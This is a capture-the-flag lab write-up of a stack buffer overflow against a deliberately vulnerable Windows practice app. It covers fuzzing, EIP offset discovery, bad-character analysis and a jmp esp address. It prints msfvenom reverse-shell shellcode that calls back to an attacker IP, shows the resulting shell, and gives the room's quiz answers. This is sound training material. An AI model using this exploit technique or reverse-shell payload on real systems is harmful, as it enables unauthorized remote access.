# OVERFLOW4
## Mona Configuration
```
!mona config -set workingfolder C:\mona\%p
```
## Fuzzing
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 4$ ./fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing with 1800 bytes
Fuzzing with 1900 bytes
Fuzzing with 2000 bytes
Fuzzing with 2100 bytes
Fuzzing crashed at 2100 bytes
```
## Controlling EIP
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 4$ cyclic 2500
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaaumaaunaauoaaupaauqaauraausaautaauuaauvaauwaauxaauyaauzaavbaavcaavdaaveaavfaavgaavhaaviaavjaavkaavlaavmaavnaavoaavpaavqaavraavsaavtaavuaavvaavwaavxaavyaavzaawbaawcaawdaaweaawfaawgaawhaawiaawjaawkaawlaawmaawnaawoaawpaawqaawraawsaawtaawuaawvaawwaawxaawyaawzaaxbaaxcaaxdaaxeaaxfaaxgaaxhaaxiaaxjaaxkaaxlaaxmaaxnaaxoaaxpaaxqaaxraaxsaaxtaaxuaaxvaaxwaaxxaaxyaaxzaaybaaycaaydaayeaayfaaygaayhaayiaayjaaykaaylaaymaaynaayoaaypaayqaayraaysaaytaayuaayvaaywaayxaayyaay
```
We get this error:
```
Access violation when executing [61687561]
```
Convert to little endian ASCII representation:
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 4$ python -c 'print(bytes.fromhex("61687561")[::-1].decode())'
auha
```
Looking up the offset:
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 4$ cyclic -l auha
2026
```
Confirmed that EIP offset is `2026` bytes
## Finding Bad Chars
In Immunity Debugger:
```
!mona bytearray -b "\x00"
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 4$ python -c '[print("\\x" + "{:02x}".format(x), end="") for x in range(1,256)]'
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
Add this to `payload` variable in `exploit.py` and re-run
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 4$ ./exploit.py
Sending evil buffer...
Done!
```
Run comparison for bad chars (`01A3FA30` is ESP address)
```
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A3FA30
```
```
mona Memory comparison results
Address                    Status                     BadChars                   Type                       Location
0x01a3fa30                 Corruption after 168 byte  00 a9 aa cd ce d4 d5       normal                     Stack
```
Bad chars are `\x00\xa9\xcd\xd4`. I remove it from `payload` in `exploit.py` and update mona bad chars:
```
!mona bytearray -b "\x00\xa9\xcd\xd4"
```
## Finding a Jump Point
```
!mona jmp -r esp -cbp "\x00\xa9\xcd\xd4"
```
```
Log data, item 11
 Address=625011AF
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

```
We will jump to `\xaf\x11\x50\x62`
## Payload
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 4$ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.23.1 LPORT=4444 EXITFUNC=thread -b "\x00\xa9\xcd\xd4" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] =
"\xda\xdd\xb8\x29\x44\x3b\x1a\xd9\x74\x24\xf4\x5b\x33\xc9"
"\xb1\x52\x31\x43\x17\x83\xeb\xfc\x03\x6a\x57\xd9\xef\x90"
"\xbf\x9f\x10\x68\x40\xc0\x99\x8d\x71\xc0\xfe\xc6\x22\xf0"
"\x75\x8a\xce\x7b\xdb\x3e\x44\x09\xf4\x31\xed\xa4\x22\x7c"
"\xee\x95\x17\x1f\x6c\xe4\x4b\xff\x4d\x27\x9e\xfe\x8a\x5a"
"\x53\x52\x42\x10\xc6\x42\xe7\x6c\xdb\xe9\xbb\x61\x5b\x0e"
"\x0b\x83\x4a\x81\x07\xda\x4c\x20\xcb\x56\xc5\x3a\x08\x52"
"\x9f\xb1\xfa\x28\x1e\x13\x33\xd0\x8d\x5a\xfb\x23\xcf\x9b"
"\x3c\xdc\xba\xd5\x3e\x61\xbd\x22\x3c\xbd\x48\xb0\xe6\x36"
"\xea\x1c\x16\x9a\x6d\xd7\x14\x57\xf9\xbf\x38\x66\x2e\xb4"
"\x45\xe3\xd1\x1a\xcc\xb7\xf5\xbe\x94\x6c\x97\xe7\x70\xc2"
"\xa8\xf7\xda\xbb\x0c\x7c\xf6\xa8\x3c\xdf\x9f\x1d\x0d\xdf"
"\x5f\x0a\x06\xac\x6d\x95\xbc\x3a\xde\x5e\x1b\xbd\x21\x75"
"\xdb\x51\xdc\x76\x1c\x78\x1b\x22\x4c\x12\x8a\x4b\x07\xe2"
"\x33\x9e\x88\xb2\x9b\x71\x69\x62\x5c\x22\x01\x68\x53\x1d"
"\x31\x93\xb9\x36\xd8\x6e\x2a\x33\x1b\x67\xab\x2b\x21\x87"
"\xba\xf7\xac\x61\xd6\x17\xf9\x3a\x4f\x81\xa0\xb0\xee\x4e"
"\x7f\xbd\x31\xc4\x8c\x42\xff\x2d\xf8\x50\x68\xde\xb7\x0a"
"\x3f\xe1\x6d\x22\xa3\x70\xea\xb2\xaa\x68\xa5\xe5\xfb\x5f"
"\xbc\x63\x16\xf9\x16\x91\xeb\x9f\x51\x11\x30\x5c\x5f\x98"
"\xb5\xd8\x7b\x8a\x03\xe0\xc7\xfe\xdb\xb7\x91\xa8\x9d\x61"
"\x50\x02\x74\xdd\x3a\xc2\x01\x2d\xfd\x94\x0d\x78\x8b\x78"
"\xbf\xd5\xca\x87\x70\xb2\xda\xf0\x6c\x22\x24\x2b\x35\x42"
"\xc7\xf9\x40\xeb\x5e\x68\xe9\x76\x61\x47\x2e\x8f\xe2\x6d"
"\xcf\x74\xfa\x04\xca\x31\xbc\xf5\xa6\x2a\x29\xf9\x15\x4a"
"\x78";
```
## Exploit
Setup listener:
```
nc -lnvp 4444
```
Run exploit:
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 4$ ./exploit.py
Sending evil buffer...
Done!
```
Popped a reverse shell! (had to make sure the payload had NOP padding)
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 4$ nc -lnvp 4444
Connection from 10.10.175.52:49308
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>echo PWNED!
echo PWNED!
PWNED!

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```
## Questions
What is the EIP offset for OVERFLOW4?
```
2026
```
In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW4?
```
\x00\xa9\xcd\xd4
```